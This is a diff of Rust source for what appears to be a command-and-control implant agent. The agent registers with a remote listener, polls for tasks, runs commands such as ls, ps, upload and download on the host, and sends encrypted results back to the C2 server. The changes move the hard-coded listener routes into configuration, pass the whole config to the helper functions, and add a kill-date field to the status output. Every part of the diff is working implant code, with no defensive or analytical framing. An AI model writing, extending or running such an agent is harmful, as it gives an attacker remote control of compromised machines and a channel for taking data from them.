@@ -44,7 +44,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
     let os = std::env::consts::OS.to_string();
     let arch = std::env::consts::ARCH.to_string();
     let listener_url = format!(
-        "{}://{}:{}/",
+        "{}://{}:{}",
         config.listener.proto.to_string(),
         config.listener.host.to_string(),
         config.listener.port.to_owned(),
@@ -56,7 +56,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         os.to_string(),
         arch.to_string(),
         listener_url.to_string(),
-        config.my_public_key,
+        config.my_public_key.clone(),
     );
 
     // Initialize client with certificates
@@ -64,8 +64,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.https_root_cert.as_bytes()
     ).unwrap();
     let client_certs = [
-        config.listener.https_client_cert,
-        config.listener.https_client_key,
+        config.listener.https_client_cert.to_string(),
+        config.listener.https_client_key.to_string(),
     ].concat();
     let client_id = reqwest::Identity::from_pem(
         client_certs.as_bytes()
@@ -97,7 +97,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
     
         // Register agent
         let response = match client
-            .post(format!("{}{}", listener_url.to_string(), "r"))
+            .post(format!("{}{}", listener_url.to_string(), config.listener.routes.register.to_string()))
             .headers(headers.clone())
             .json(&rad)
             .send()
@@ -127,7 +127,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
         // Get task
         let task = match client
-            .post(format!("{}{}", listener_url.to_string(), "t/a"))
+            .post(format!("{}{}", listener_url.to_string(), config.listener.routes.task_ask.to_string()))
             .headers(headers.clone())
             .json(&plaindata)
             .send()
@@ -173,9 +173,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -184,9 +183,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -199,9 +197,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -210,9 +207,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -228,9 +224,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -239,9 +234,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -260,9 +254,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -271,9 +264,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -295,15 +287,15 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
                 output = output + format!("{:<12} : {}\n", "SLEEP", sleeptime.to_string()).as_str();
                 output = output + format!("{:<12} : {}\n", "JITTER", config.jitter.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "KILLDATE", config.killdate.to_string()).as_str();
 
                 post_task_result(
                     output.as_bytes(),
                     agent_name.to_string(),
                     listener_url.to_string(),
                     headers.clone(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
                     &client,
+                    &config,
                 ).await;
             }
             "ls" => {
@@ -339,9 +331,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -350,9 +341,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -365,9 +355,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -376,9 +365,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -405,9 +393,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     agent_name.to_string(),
                     listener_url.to_string(),
                     headers.clone(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
                     &client,
+                    &config,
                 ).await;
             }
             "ps" => {
@@ -428,9 +415,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
                                 &client,
+                                &config,
                             ).await;
                         }
                     }
@@ -457,9 +443,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     _ => {
@@ -468,9 +453,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -484,9 +468,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -495,9 +478,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -511,9 +493,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
                                 &client,
+                                &config,
                             ).await;
                         }
                         Err(e) => {
@@ -522,9 +503,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
                                 &client,
+                                &config,
                             ).await;
                         }
                     }
@@ -537,9 +517,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
                                 &client,
+                                &config,
                             ).await;
                         }
                         Err(e) => {
@@ -548,9 +527,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
                                 &client,
+                                &config,
                             ).await;
                         }
                     }
@@ -564,9 +542,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -575,9 +552,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -590,9 +566,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -601,9 +576,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -616,9 +590,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     agent_name.to_string(),
                     listener_url.to_string(),
                     headers.clone(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
                     &client,
+                    &config,
                 ).await;
             }
             "upload" => {
@@ -634,9 +607,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     agent_name.to_string(),
                     listener_url.to_string(),
                     headers.clone(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
                     &client,
+                    &config,
                 ).await {
                     Ok(d) => d,
                     Err(e) => {
@@ -645,9 +617,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
 
                         continue;
@@ -662,9 +633,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
 
                         continue;
@@ -678,9 +648,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -689,9 +658,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
                             &client,
+                            &config,
                         ).await;
                     }
                 }
@@ -704,9 +672,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     agent_name.to_string(),
                     listener_url.to_string(),
                     headers.clone(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
                     &client,
+                    &config,
                 ).await;
             }
             _ => {
@@ -718,48 +685,48 @@ pub async fn run(config: Config) -> Result<(), Error> {
     Ok(())
 }
 
+// Send task result to the C2 server
 async fn post_task_result(
     plaindata: &[u8],
     agent_name: String,
     listener_url: String,
     headers: HeaderMap,
-    my_secret_key: StaticSecret,
-    server_public_key: PublicKey,
     client: &reqwest::Client,
+    config: &Config,
 ) {
     let cipherdata = CipherData::new(
         agent_name,
         plaindata,
-        my_secret_key,
-        server_public_key,
+        config.my_secret_key.clone(),
+        config.server_public_key.clone(),
     );
 
     client
-        .post(format!("{}{}", listener_url, "t/r"))
+        .post(format!("{}{}", listener_url, config.listener.routes.task_result.to_string()))
         .headers(headers)
         .json(&cipherdata)
         .send()
         .await;
 }
 
+// Download a file from the C2 server
 async fn download(
     plaindata: &[u8],
     agent_name: String,
     listener_url: String,
     headers: HeaderMap,
-    my_secret_key: StaticSecret,
-    server_public_key: PublicKey,
     client: &reqwest::Client,
+    config: &Config,
 ) -> Result<Vec<u8>, Error> {
     let cipherdata = CipherData::new(
         agent_name,
         plaindata,
-        my_secret_key,
-        server_public_key,
+        config.my_secret_key.clone(),
+        config.server_public_key.clone(),
     );
 
     let resp = client
-        .post(format!("{}{}", listener_url, "t/u"))
+        .post(format!("{}{}", listener_url, config.listener.routes.task_upload.to_string()))
         .headers(headers)
         .json(&cipherdata)
         .send()
